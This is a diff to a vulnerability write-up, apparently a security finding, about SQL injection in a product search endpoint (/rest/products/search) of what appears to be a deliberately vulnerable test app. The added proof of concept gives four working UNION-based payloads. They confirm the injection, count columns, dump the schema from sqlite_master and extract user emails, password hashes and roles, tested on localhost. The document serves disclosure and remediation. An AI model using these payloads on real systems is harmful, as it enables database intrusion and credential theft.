@@ -32,11 +32,27 @@ An attacker can craft a 200-character-or-shorter payload (SQL injection payloads
 
 ## Proof of concept
 
+**Step 1 — confirm injection** (returns 500 with SQLite error):
 ```
-GET /rest/products/search?q=')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
+GET /rest/products/search?q='
 ```
 
-Leaks the database schema via UNION injection.
+**Step 2 — enumerate columns** (10 columns confirmed):
+```
+GET /rest/products/search?q=')) UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+```
+
+**Step 3 — extract database schema**:
+```
+GET /rest/products/search?q=')) UNION SELECT sql,2,3,4,5,6,7,8,9,10 FROM sqlite_master--
+```
+Returns full DDL for all tables: `Users`, `Cards`, `SecurityAnswers`, `Wallets`, etc., including column names and types.
+
+**Step 4 — extract user credentials**:
+```
+GET /rest/products/search?q=')) UNION SELECT email,password,role,4,5,6,7,8,9,10 FROM Users--
+```
+Returns all user emails, hashed passwords, and roles. **Tested and confirmed in runtime on `localhost:3000`.**
 
 ## Fix
 
